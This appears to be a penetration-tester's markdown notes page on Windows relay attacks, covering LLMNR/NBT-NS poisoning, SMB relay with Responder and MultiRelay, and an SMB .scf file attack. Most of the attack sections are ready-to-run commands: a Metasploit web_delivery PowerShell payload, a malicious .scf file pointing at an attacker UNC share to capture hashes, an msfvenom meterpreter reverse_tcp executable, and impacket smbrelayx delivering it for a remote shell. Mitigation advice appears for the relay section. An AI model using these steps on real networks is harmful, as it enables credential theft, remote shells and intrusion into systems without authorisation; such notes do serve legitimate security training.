# Relay attacks
---
# Navigation
- **[Whats LLMNR](#Whats%20LLMNR)**
- **[SMB relay attack](#SMB%20relay%20attack)**
- **[SMB scf attack](#SMB%20scf%20attack)**
- **[Further reading](#Further%20reading)**
---
# Whats LLMNR?
**Link-Local Multicast Name Resolution (LLMNR)** and **NetBIOS Name Service (NBT-NS)** are Microsoft Windows components that serve as alternate methods of host identification. **LLMNR is based upon the Domain Name System (DNS) format** and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.
But this method of host resolution has severe security impact, as when a non-existing host is searched using LLMNR method, it **broadcasts** the search request to every system connected to the local network. As a result, **if any of the systems in local network is somehow compromised by an attacker, it also receives the host search query and can send a response to the victim** (the system which initiated the host resolution query) that it knows the host **and in turn ask for the password hash of the victim**.

![LLMNR.png](../../assets/Active Directory/Attack vectors/LLMNR.png)

---
# SMB relay attack
## Definition
SMB signing is a security mechanism that allows digitally signing SMB packets to enforce their authenticity and integrity - the client/server knows that the incoming SMB packets they are receiving are coming from a trusted source and that they have not been tampered with while in transit, preventing man in the middle type attacks.
Instead of cracking the NTLM hashes taken from the LLMNR poisoning attack or any other method we can authenticate using the hash using SMB relay attack but this requires two conditions:
- The victim user must be a local admin.
- SMB signing must be disabled.
## Checking if SMB signing id disabled
```bash 
nmap -p 445 -sS --script smb-security-mode.nse <Target-IP>
```
## Exploitation
1. Turn off the SMB and HTTP servers by changing ‘On’ to ‘Off’.
```bash
nano /usr/share/responder/Responder.conf
```
2. Run Responder.
```bash
responder -I <Interface> -rv
#-I (capital i specifies interface) -rv (required settings for relay attack)
```
3. Boot up Multi-Relay and wait.
```bash
cd /usr/share/responder/tools
python MultiRelay.py -t <Targete-IP> -u ALL
```
4. Post-exploitation
Shut off responder and let's get a system shell
```bash
msfconsole
use exploit/multi/script/web_delivery
show targets #Then select 'PSH' (Powershell)
run
```
5. Take the command from metsaploit and execute it in the multirelay shell.
## Mitigations
1. Disable LLMNR and NetBIOS in local security settings or by group policy this can be done by running the following powershell command to change the registry to disbale llmnr and netbios.
```powershell
New-Item "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT" -Name DNSClient  -Force
New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name EnableMultiCast -Value 0 -PropertyType DWORD  -Force
```
2.  Enabling SMB signing can stop NTLMv2 relay attacks (note that this will increase traffic because of the additional processing for each packet) and also some printers may not support SMB singing. To turn on SMB signing you can do so through group policy by enabling “Microsoft network client: Digitally sign communication (always)”
3.  Network segmentation is another way in which this can be mitigated because then the man in the middle attack is limited in scope. This can be achieved by segmenting the network through Vlans.
---
# SMB .scf attack
SCF (Shell Command Files) files can be used to perform a limited set of operations such as showing the Windows desktop or opening a Windows explorer. However a SCF file can be used to **access a specific UNC path** which allows the penetration tester to build an attack.
> **A UNC path** is the path to a folder or file on a network and contains the server name in the path.
## Attack
1. Create a `File.scf` then upload the file.
```txt
[Shell]
Command=2
IconFile=\\192.168.1.171\share\AbuQasem.ico
[Taskbar]
Command=ToggleDesktop
```
> **NOTE**:
> It's recommended to add a `@file.scf` before the file name so the file will be listed in the top of the share folder.


2. Run `responder` and wait for the hash.
```bash
responder -wrf --lm -v -I eth0
```
3. If you want to go further and get a shell, create a malicious file and setup the `multi/handler`
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.171 LPORT=5555 -f exe > abuqasem.exe
```
4. Relay the file and check the msfconsole for the shell.
```bash
impacket-smbrelayx -h Target-IP -e ./abuqasem.exe
```
---
# Further reading
1. [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
2.   [https://medium.com/@subhammisra45/llmnr-poisoning-and-relay-5477949b7bef](https://medium.com/@subhammisra45/llmnr-poisoning-and-relay-5477949b7bef)
3.   [https://book.hacktricks.xyz/pentesting/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks](https://book.hacktricks.xyz/pentesting/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks)
4.   [https://www.ired.team/offensive-security/lateral-movement/lateral-movement-via-smb-relaying-by-abusing-lack-of-smb-signing](https://www.ired.team/offensive-security/lateral-movement/lateral-movement-via-smb-relaying-by-abusing-lack-of-smb-signing)
5.   https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/